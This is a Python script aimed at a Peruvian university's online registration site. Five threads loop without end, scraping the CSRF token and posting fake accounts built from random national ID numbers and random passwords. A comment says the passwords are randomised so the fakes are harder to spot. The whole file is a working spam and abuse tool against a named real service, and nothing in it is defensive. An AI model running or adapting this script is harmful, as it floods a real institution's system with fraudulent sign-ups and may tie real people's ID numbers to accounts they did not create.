from bs4 import BeautifulSoup
import requests
import random
import time
import hashlib
import threading

headers = {
    "Origin":"http://www.inscripciones.uni.edu.pe",
    "Upgrade-Insecure-Requests":"1",
    "Content-Type":"application/x-www-form-urlencoded",
    "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Referer":"http://www.inscripciones.uni.edu.pe/register",
    "Accept-Encoding":"gzip, deflate",
    "Accept-Language":"es-ES,es;q=0.9,en;q=0.8"
}
cont = 0
def make_request():
    global cont
    while True :
        r = requests.get("http://www.inscripciones.uni.edu.pe/login");
        text = r.text
        soup = BeautifulSoup(text , features = "lxml").body
        token = soup.find_all('input')[0]['value']
        dni_str = "7"+str(random.randint(1000000,9999999)) # people from Peru [16> years] now have a ID starting with 7 I think
        len_password = random.randint(8,15)
        password = hashlib.sha256(str(random.randint(1000000000,9999999999)).encode()).hexdigest()[:len_password] # Making difficult to find wich one is fake
        data = {
            '_token':token,
            'dni': dni_str,
            'password': password,
            'password_confirmation': password
        }
        try:
            r = requests.post('http://www.inscripciones.uni.edu.pe/register', data = data, headers=headers, cookies=r.cookies)
            if r.status_code==200:
                cont+=1
                #if cont%50==0:
                print("\r{:d} requests enviados".format(cont),end='')
                time.sleep(0.100)
            else:
                print("Error:", r.status_code)

        except ValueError:
            print("Error: retrying http post")
            time.sleep(2)

Nhilos = 5
hilos = []
for i in range(Nhilos):
    hilos.append(threading.Thread(target=make_request))
    print("Comenzando hilo:",i+1)
    hilos[i].start()
for i in range(Nhilos):
    hilos[i].join()
